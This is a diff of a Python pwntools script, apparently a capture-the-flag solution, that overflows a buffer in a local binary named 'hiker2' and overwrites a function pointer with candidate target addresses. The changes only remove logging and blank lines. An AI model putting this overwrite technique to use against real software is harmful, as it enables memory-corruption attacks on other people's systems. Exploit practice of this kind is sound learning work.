@@ -61,9 +61,7 @@ def find_target_function():
             possible_targets.append(addr)
         return possible_targets
 
-def exploit():
-    """Main exploitation"""
-    
+def exploit():    
     # Step 1: Run once to get addresses
     p = process(['./hiker2', 'AAAA'])
     
@@ -75,14 +73,10 @@ def exploit():
     data_addr = int(parts[0].split('0x')[1], 16)
     fp_addr = int(parts[1].split('0x')[1], 16)
     
-    log.success(f"data at: {hex(data_addr)}")
-    log.success(f"fp at:   {hex(fp_addr)}")
-    
     # Calculate distance between data and fp
     distance = fp_addr - data_addr
     
     p.close()
-    
     
     # Step 2: Try common target addresses
     possible_targets = find_target_function()
@@ -91,11 +85,9 @@ def exploit():
     
     for target in possible_targets:
         log.info(f"\nTrying target address: {hex(target)}")
-        
         # Build payload: padding + target address
         payload = b'A' * distance
         payload += p32(target)  # Overwrite fp with target address
-        
         
         try:
             p = process(['./hiker2', payload])
@@ -109,9 +101,7 @@ def exploit():
                 
         except Exception as e:
             log.warning(f"Crash or error: {e}")
-        
         p.close()
-    
     return None
 
 if __name__ == '__main__':
